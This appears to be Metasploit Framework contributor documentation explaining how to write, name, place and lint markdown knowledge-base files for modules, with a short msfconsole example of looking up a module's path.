Before you write any module documentation, you should take a look at the sample template, module_doc_template.md, or take a look at any of the KBs that are already available. Writing a KB . To write a KB, you’ll need to: . | Create a markdown (.md) file. | Write the content. | Save the file and name it after the module name. For example, the filename for ms08-067 is modules/exploits/windows/smb/ms08_067_netapi.rb, so its documentation is documentation/modules/exploits/windows/smb/ms08_067_netapi.md. | Place it in the metasploit-framework/documentation/modules directory. | . Where to put the markdown files . If you go to metasploit-framework/documentation/modules, you’ll see that there are documentation directories for each module type: auxiliary, exploit, payload, and post. To figure out where you need to put the file, you’ll need to look at the module’s path. | Start msfconsole. | Type use &lt;module name&gt;. | Type info -d. | When the module name appears, look at the Module field. You’ll see a file path for the module. That’s the path where the KB needs to be added. | . For example: . msf&gt; use auxiliary/scanner/smb/smb_login msf (smb_login)&gt; info Name: SMB Login Check Scanner Module: auxiliary/scanner/smb/smb_login .... If you were creating a KB for the smb login scanner, you’d add it to metasploit-framework/documentation/modules/auxiliary/smb.md. Sections you should include in the KB . These are just suggestions, but it’d be nice if the KB had these sections: . | Vulnerable Applications - Tells users what targets are vulnerable to the module and provides instructions on how to access vulnerable targets for testing. | Verification Steps - Tells users how to use the module and what the expected results are from running the module. | Options - Provides descriptions of all the options that can be run with the module. Additionally, clearly identify the options that are required. | Scenarios - Provides sample usage and describes caveats that the user may need to be aware of when running the module. | .

A documentation file can be passed as a positional argument to metasploit-framework/tools/dev/msftidy_docs.rb and will highlight formatting errors the docs file might contain.
